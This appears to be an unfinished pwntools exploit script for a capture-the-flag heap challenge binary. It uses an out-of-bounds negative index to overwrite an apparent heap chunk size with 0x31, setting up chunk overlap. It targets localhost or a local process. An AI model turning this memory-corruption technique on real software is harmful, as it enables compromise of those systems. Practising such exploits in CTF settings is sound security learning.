#!/usr/bin/python3

from pwn import *

exe = ELF('chal', checksec=False)

context.binary = exe

def GDB():
        if not args.REMOTE:
                gdb.attach(p, gdbscript='''
                b*main+300
                b*main+237
                c
                ''')
                input()

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

if args.REMOTE:
        p = remote('localhost', 5000)
else:
        p = process(exe.path)

GDB()
def create(size, data):
        sla(b"size", size)
        sa(b"data", data )
def change(index, data):
        sla(b"index", index)
        sla(b"character", data)

create(b"8", b"a" * 8)
create(b"16", b"a" * 16)
change(b"-8", p8(0x31))
create(b"40", b"a" * 40)


p.interactive()
